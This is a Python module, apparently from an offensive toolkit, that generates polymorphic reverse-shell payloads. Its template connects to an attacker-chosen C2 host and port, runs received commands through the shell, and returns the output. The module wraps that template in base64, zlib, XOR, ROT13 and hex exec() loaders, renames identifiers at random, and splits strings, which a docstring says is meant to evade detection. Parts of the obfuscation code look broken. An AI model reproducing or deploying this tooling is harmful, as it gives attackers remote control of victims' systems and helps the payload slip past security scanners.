# Polymorphic Payloads Module
import base64
import zlib
import random
import string
import hashlib
import json
from pathlib import Path

class PolymorphicPayload:
    def __init__(self, c2_host: str, c2_port: int):
        self.c2_host = c2_host
        self.c2_port = c2_port
        self.payload_template = self._get_template()
        
    def _get_template(self) -> str:
        """Get the base payload template"""
        return f'''
import socket,subprocess,os,sys,json,base64

def connect():
    sock = socket.socket()
    sock.connect(("{self.c2_host}", {self.c2_port}))
    
    while True:
        try:
            data = sock.recv(4096).decode()
            if not data: break
            
            result = subprocess.run(data, shell=True, capture_output=True, text=True)
            output = result.stdout + result.stderr
            
            sock.sendall(len(output).to_bytes(4, 'big'))
            sock.sendall(output.encode())
        except:
            break
    
    sock.close()

connect()
'''
    
    def generate_polymorphic(self, method: str = "all") -> dict:
        """Generate polymorphic payload using multiple techniques"""
        payloads = {}
        
        if method == "all" or method == "base64":
            payloads["base64"] = self._encode_base64()
        
        if method == "all" or method == "zlib":
            payloads["zlib"] = self._compress_zlib()
        
        if method == "all" or method == "xor":
            payloads["xor"] = self._encode_xor()
        
        if method == "all" or method == "rot13":
            payloads["rot13"] = self._encode_rot13()
        
        if method == "all" or method == "hex":
            payloads["hex"] = self._encode_hex()
        
        if method == "all" or method == "obfuscate":
            payloads["obfuscated"] = self._obfuscate()
        
        if method == "all" or method == "string_split":
            payloads["split"] = self._split_strings()
        
        return payloads
    
    def _encode_base64(self) -> str:
        """Encode payload in base64"""
        encoded = base64.b64encode(self.payload_template.encode()).decode()
        
        return f'''import base64;exec(base64.b64decode("{encoded}"))'''
    
    def _compress_zlib(self) -> str:
        """Compress and encode payload"""
        compressed = zlib.compress(self.payload_template.encode())
        encoded = base64.b64encode(compressed).decode()
        
        return f'''import base64,zlib;exec(zlib.decompress(base64.b64decode("{encoded}")))'''
    
    def _encode_xor(self, key: int = None) -> str:
        """XOR encode payload"""
        if key is None:
            key = random.randint(1, 255)
        
        xor_data = bytes([b ^ key for b in self.payload_template.encode()])
        encoded = base64.b64encode(xor_data).decode()
        
        return f'''
import base64
data = base64.b64decode("{encoded}")
exec("".join([chr(b ^ {key}) for b in data]))
'''
    
    def _encode_rot13(self) -> str:
        """ROT13 encode payload"""
        import codecs
        
        encoded = codecs.encode(self.payload_template, 'rot_13')
        
        return f'''import codecs;exec(codecs.decode("{encoded}", "rot_13"))'''
    
    def _encode_hex(self) -> str:
        """Hex encode payload"""
        encoded = self.payload_template.encode().hex()
        
        return f'''exec(bytes.fromhex("{encoded}").decode())'''
    
    def _obfuscate(self) -> str:
        """Obfuscate payload with random variable names"""
        obfuscated = self.payload_template
        
        # Replace common names with random ones
        replacements = {
            'socket': self._random_name(),
            'subprocess': self._random_name(),
            'os': self._random_name(),
            'sys': self._random_name(),
            'json': self._random_name(),
            'base64': self._random_name(),
            'connect': self._random_name(),
            'sock': self._random_name(),
            'data': self._random_name(),
            'result': self._random_name(),
            'output': self._random_name(),
        }
        
        for old, new in replacements.items():
            obfuscated = obfuscated.replace(old, new)
        
        # Add imports at top
        imports = 'import ' + ', '.join(replacements.values().split(',')[:7])
        obfuscated = imports + '\n' + obfuscated
        
        return obfuscated
    
    def _split_strings(self) -> str:
        """Split strings to evade detection"""
        split_payload = self.payload_template
        
        # Split common strings
        split_payload = split_payload.replace('socket', 'so' + 'cket')
        split_payload = split_payload.replace('connect', 'con' + 'nect')
        split_payload = split_payload.replace('subprocess', 'sub' + 'process')
        split_payload = split_payload.replace('shell', 'sh' + 'ell')
        
        return split_payload
    
    def _random_name(self, length: int = 8) -> str:
        """Generate random variable name"""
        return ''.join(random.choices(string.ascii_lowercase, k=length))
    
    def get_hash(self, payload: str) -> str:
        """Get hash of payload"""
        return hashlib.sha256(payload.encode()).hexdigest()
    
    def generate_one_liner(self, method: str = "base64") -> str:
        """Generate one-liner payload"""
        payloads = self.generate_polymorphic(method)
        
        if method in payloads:
            return payloads[method]
        
        return payloads["base64"]


def generate_payload(c2_host: str, c2_port: int, method: str = "all"):
    """Quick payload generation function"""
    pp = PolymorphicPayload(c2_host, c2_port)
    return pp.generate_polymorphic(method)


def generate_one_liner(c2_host: str, c2_port: int, method: str = "base64"):
    """Quick one-liner generation function"""
    pp = PolymorphicPayload(c2_host, c2_port)
    return pp.generate_one_liner(method)
